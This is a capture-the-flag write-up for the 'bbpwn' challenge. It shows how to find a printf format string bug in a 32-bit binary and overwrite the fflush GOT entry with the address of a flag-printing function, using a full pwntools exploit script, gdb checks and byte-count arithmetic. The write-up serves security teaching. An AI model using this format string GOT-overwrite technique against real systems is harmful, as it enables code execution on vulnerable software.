#	bbpwn

Let's take a look at the binary they gave us:
```
$	file 32_new 
32_new: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=da5e14c668579652906e8dd34223b8b5aa3becf8, not stripped
$	pwn checksec 32_new 
[*] '/Hackery/backdoor/bbpwn/32_new'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So we can see it is a 32 bit elf with a Non-Executable stack. Let's try running it.

```
$	./32_new 
Hello baby pwner, whats your name?
give me the flag
Ok cool, soon we will know whether you pwned it or not. Till then Bye give me the flag
```

So it prompted us for input, then it printed out the data we sent it. Since it is printing out user defined data, this might be a format string bug. Let's test it by giving it `%x` formatters:

```
$	./32_new 
Hello baby pwner, whats your name?
%x.%x.%x.%x.%x
Ok cool, soon we will know whether you pwned it or not. Till then Bye 8048914.ff98e0d8.1.f739a618.36e
```

So this verifies that it is a format string bug. We know this because when we gave it the formatter for printf to print data as hex `%x`, it printed out hex strings that we didn't give it/ Let's take a look at the code in IDA so we can see what we can do with this vulnerabillity.

```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char input_data; // [sp+18h] [bp-200h]@1
  char printed_string; // [sp+E0h] [bp-138h]@1
  int v5; // [sp+20Ch] [bp-Ch]@1

  v5 = *MK_FP(__GS__, 20);
  puts("Hello baby pwner, whats your name?");
  fflush(stdout);
  fgets(&input_data, 200, edata);
  fflush(edata);
  sprintf(&printed_string, "Ok cool, soon we will know whether you pwned it or not. Till then Bye %s", &input_data);
  fflush(stdout);
  printf(&printed_string);
  fflush(stdout);
  exit(1);
}
```

So we can see here the function of the code. It first scans in data through an fgets call, then appends our input the the back of a string using `sprintf`, then prints out that string without formatting it which is where we get the format string exploit. Using this we should be able to overwrite the address of `fflush` with something else. Looking through the code, we find a function that looks appealing:

```
int flag(void)
{
  return system("cat flag.txt");
}
```

This is the function `flag`., It appears to just cat out the `flag.txt` file. So if we overwrote the address of `fflush` with the address of the `flag` function, when it tried to run the fflush function after the format string exploit it would run the `flag` function and we would get the flag. In order to do that, first we need to find how far away our input on the stack is for the format string exploit.

```
./32_new 
Hello baby pwner, whats your name?
0000.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Ok cool, soon we will know whether you pwned it or not. Till then Bye 0000.8048914.ffbbd4c8.1.f73f6618.36e.f73fc668.ffbbd774.ffbbd514.ffbbd510.30303030.2e78252e.252e7825
```

So we an see here our input is 10 words away from our printf call. Next thing we need to find out is the address of fflush, which is the address we are overwriting:

```
objdump -R 32_new | grep fflush
0804a028 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```

So the address that we need to overwrite is at `0x804a028`. Now we need to find the address that we need to write to it, which is the addressof `flag`. 

```
$	objdump -D 32_new | grep flag
0804870b <_Z4flagv>:
0804883c <_GLOBAL__sub_I__Z4flagv>:
```

So we see that the address we need to overwrite is `0x0804870b`.So now that we know what to write, and where to write it there is only one more thing left. In order to write the address `0x0804870b` we need to print 0x0804780b bytes. Reasonably speaking that just isn't feasible. What we can do is write to the address three times (will explain why three later), so effictively we will have to print way less bytes. 

A couple of things, first we will have to write to the least singificant bit first. Secondly each subsequent write will be greater than the last. First let's see how much data we are writing to the adress without adding any extra bytes. We will do so with this python script:

```
#Import pwntools
from pwn import *

#Establish the target process, or network connection
target = process('./32_new')
#target = remote('163.172.176.29', 9035)

#Attach gdb if it is a process
gdb.attach(target)

#Print the first line of text
print target.recvline()

#Prompt for input, to pause for gdb
raw_input()

#Establish the addresses which we will be writing to
fflush_adr0 = p32(0x804a028)
fflush_adr1 = p32(0x804a029)
fflush_adr2 = p32(0x804a02b)

#Establish the necissary offputs for our input, so we can write to the addresses
fmt_string0 = "%10$n"
fmt_string1 = "%11$n"
fmt_string2 = "%12$n"

#Form the payload
payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fmt_string0 + fmt_string1 + fmt_string2

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
```

and when we run the script, we and pass the process to  gdb:
```
gdb-peda$ b *0x80487dc
gdb-peda$ c
```

after the breakpoint:

```
Breakpoint 1, 0x080487dc in main ()
gdb-peda$ x/x 0x804a028
0x804a028:	0x52
gdb-peda$ x/w 0x804a028
0x804a028:	0x52005252
```

So we can see a couple of things. Firstly that we are writing to the first, second, and fourth byte of the `fflush` address. Secondly that the initial starting value we write is `0x52`. This is a problem since we need to write the value `0x0b` to the first byte, which is smaller than `0x52`. This can be fixed if instead we write `0x10b` to the first byte, whcih will overfow into the second byte. However it will leave the first byte equal to `0x0b`.

To calculate the amount of bytes we need to write, we can just use python:
```
>>> 0x10b - 0x52
185
```

So we will need to print 185 additional bytes for the first write. For the second write, we need to set the second and third bytes equal to `0x0487`. Since we added 185 bytes to the first write, it should write 185 + 0x52 = 267 bytes by default. So in order to reach `0x0487` we will need to print an additional `0x0487 - 267 = 892` bytes to write the appropriate value.

Lastly we just have to figure out the amount of bytes we need to write to set the fourth byte euqal to `0x08`. Of course by now this write is going to overflow into other bytes outside of this address, howver it shouldn't stop the exploit. Write now it should write `892 + 267 = 1159` bytes of data without us adding anything. let's use python to see how many more additional bytes we will need to print, in order for the last byte of the hex string we write to be `0x08`.

```
>>> hex(1159)
'0x487'
>>> 0x508 - 0x487
129
```

So for the last write, we will need to print an additional 129 bytes. With all of this information, we can write the exploit. It will look something like this:

```
payload = first_adr + second_adr + third_adr + first_byte_print + first_offset_write + second_byte_print + second_offset_write + third_byte_print + third_offset_write
``` 

and here is the python code for that:
```
#Import pwntools
from pwn import *

#Establish the target process, or network connection
#target = process('./32_new')
target = remote('163.172.176.29', 9035)

#Attach gdb if it is a process
#gdb.attach(target)

#Print the first line of text
print target.recvline()

#Prompt for input, to pause for gdb
raw_input()

#Establish the addresses which we will be writing to
fflush_adr0 = p32(0x804a028)
fflush_adr1 = p32(0x804a029)
fflush_adr2 = p32(0x804a02b)

#Establish the amount of bytes needed to be printed in order to write correct value
flag_val0 = "%185x"
flag_val1 = "%892x"
flag_val2 = "%129x"

#Establish the necissary offputs for our input, so we can write to the addresses
fmt_string0 = "%10$n"
fmt_string1 = "%11$n"
fmt_string2 = "%12$n"

#Form the payload
payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + flag_val0 + fmt_string0 + flag_val1 + fmt_string1 + flag_val2 + fmt_string2

#Send the payload
target.sendline(payload)

#Drop to an interacrtive shell
target.interactive()
```

and when we run the exploit:
```
$	python exploit.py 
[+] Opening connection to 163.172.176.29 on port 9035: Done
Hello baby pwner, whats your name?

input
[*] Switching to interactive mode
flag{hey_c0ngr4ts_Y0u_pwn3d_1t_y0u_4r3_n0_l0ng3r_a_b4by}
Ok cool, soon we will know whether you pwned it or not. Till then Bye (\xa0\x0)\xa0\x0+\xa0\x0                                                                                                                                                                                  8048914                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ffcefc48                                                                                                                                1
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 163.172.176.29 port 9035
```

Just like that, we captured the flag `flag{hey_c0ngr4ts_Y0u_pwn3d_1t_y0u_4r3_n0_l0ng3r_a_b4by}`.
